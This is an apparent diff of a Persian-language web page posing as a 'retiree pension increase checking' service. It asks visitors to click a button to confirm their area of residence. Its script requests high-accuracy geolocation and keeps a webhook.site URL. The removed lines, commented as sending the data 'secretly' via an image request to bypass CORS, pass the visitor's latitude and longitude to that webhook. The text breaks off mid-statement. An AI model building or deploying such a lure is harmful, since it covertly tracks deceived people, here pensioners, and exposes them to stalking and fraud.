@@ -37,10 +37,10 @@
         .btn:hover { background-color: #27ae60; }
         .btn:disabled { background-color: #bdc3c7; cursor: not-allowed; }
         #result { margin-top: 20px; font-weight: bold; }
-        .error-text { color: #e74c3c; }
     </style>
 </head>
 <body>
+
     <div class="container">
         <h2>سامانه بررسی افزایش حقوق بازنشستگان</h2>
         <p>جهت تایید منطقه سکونت و مشاهده وضعیت پرداخت‌ها، روی دکمه زیر کلیک نمایید.</p>
@@ -54,29 +54,25 @@
     const WEBHOOK_URL = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
 
     function getLocation() {
+        // ریست کردن وضعیت
         result.textContent = "";
-        result.className = "";
-
+        
         if (!navigator.geolocation) {
             alert("مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.");
             return;
         }
 
+        // تغییر وضعیت دکمه
         button.disabled = true;
         button.innerHTML = "در حال بررسی...";
 
         navigator.geolocation.getCurrentPosition(sendPosition, showError, {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
+            enableHighAccuracy: true, 
+            timeout: 15000, 
+            maximumAge: 0 
         });
     }
 
     function sendPosition(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        
-        // ارسال مخفیانه داده‌ها از طریق Image Request برای دور زدن CORS
-        const dataUrl = `${WEBHOOK_URL}?lat=${lat}&lon=${lon}`;
-        const img = new Image();
-        img.src = dataUrl
